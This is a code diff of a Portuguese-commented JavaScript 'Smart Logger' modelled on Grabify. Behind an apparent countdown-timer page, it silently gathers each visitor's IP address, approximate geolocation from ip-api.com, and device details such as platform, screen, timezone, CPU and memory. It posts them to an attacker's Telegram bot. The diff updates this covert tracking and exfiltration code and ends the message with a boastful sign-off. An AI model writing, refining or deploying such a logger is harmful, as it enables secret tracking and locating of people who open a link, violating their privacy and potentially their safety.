@@ -1,6 +1,6 @@
-// script.js - Versão Smart Logger (estilo Grabify)
+// script.js - Smart Logger + Nova API de Geolocalização (ip-api.com)
 
-let targetDate = new Date("2026-04-20T01:35:59").getTime();
+let targetDate = new Date("2026-04-20T01:44:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -16,25 +16,13 @@ function getDeviceInfo() {
         platform: navigator.platform,
         language: navigator.language || navigator.userLanguage,
         screen: `${window.screen.width} x ${window.screen.height}`,
-        availScreen: `${window.screen.availWidth} x ${window.screen.availHeight}`,
         windowSize: `${window.innerWidth} x ${window.innerHeight}`,
         pixelRatio: window.devicePixelRatio || 1,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        online: navigator.onLine,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'unknown',
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown', // núcleos do processador
-        deviceMemory: navigator.deviceMemory || 'unknown', // memória RAM aproximada (GB)
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
         isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
     };
-
-    // Tenta pegar bateria (funciona melhor em mobile)
-    if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-            info.batteryLevel = Math.floor(battery.level * 100) + '%';
-            info.isCharging = battery.charging ? 'Sim' : 'Não';
-        }).catch(() => {});
-    }
 
     return info;
 }
@@ -50,30 +38,25 @@ function sendToTelegram() {
                     `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
                     `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                     `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
-                    `📱 Dispositivo:\n` +
+                    `📱 Informações do Dispositivo:\n` +
                     `• Sistema: ${device.platform}\n` +
-                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                     `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                     `• Janela: ${device.windowSize}\n` +
                     `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
                     `• Idioma: ${device.language}\n` +
-                    `• Fuso horário: ${device.timezone}\n` +
-                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
+                    `• Fuso Horário: ${device.timezone}\n` +
+                    `• CPU Núcleos: ${device.hardwareConcurrency}\n` +
                     `• Memória RAM aprox: ${device.deviceMemory} GB\n\n` +
-                    `🔋 Bateria: ${device.batteryLevel || 'Não disponível'} | Carregando: ${device.isCharging || 'Não disponível'}\n` +
-                    `🌐 Online: ${device.online ? 'Sim' : 'Não'}`;
+                    `Não é magia, é habilidade...`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
     })
     .then(res => res.json())
     .then(data => {
-        if (data.ok) console.log("✅ Enviado para Telegram com sucesso!");
+        if (data.ok) console.log("✅ Enviado para Telegram!");
         else console.error("Telegram Error:", data.description);
     })
     .catch(err => console.error("Erro Telegram:", err));
@@ -109,21 +92,30 @@ function updateTimer() {
     `;
 }
 
-// Busca IP + Localização
+// ==================== NOVA BUSCA DE IP + LOCALIZAÇÃO ====================
 fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
         userIPv4 = data.ip;
-        return fetch(`https://ipapi.co/${userIPv4}/json/`);
+        console.log("IP obtido:", userIPv4);
+
+        // Nova API: ip-api.com (mais estável para lat/lon)
+        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,message,lat,lon,country,city,regionName,isp`);
     })
     .then(r => r.json())
     .then(data => {
-        userLatitude = data.latitude || '';
-        userLongitude = data.longitude || '';
-        console.log("Localização:", userLatitude, userLongitude);
+        if (data.status === "success") {
+            userLatitude = data.lat || '';
+            userLongitude = data.lon || '';
+            console.log("✅ Localização obtida com sucesso:", userLatitude, userLongitude);
+        } else {
+            console.warn("Aviso da API:", data.message);
+        }
     })
-    .catch(err => console.error("Erro ao pegar localização:", err));
+    .catch(err => {
+        console.error("Erro ao buscar IP ou localização:", err);
+    });
 
-// Inicia tudo
+// Inicia o timer
 timerInterval = setInterval(updateTimer, 100);
 updateTimer();
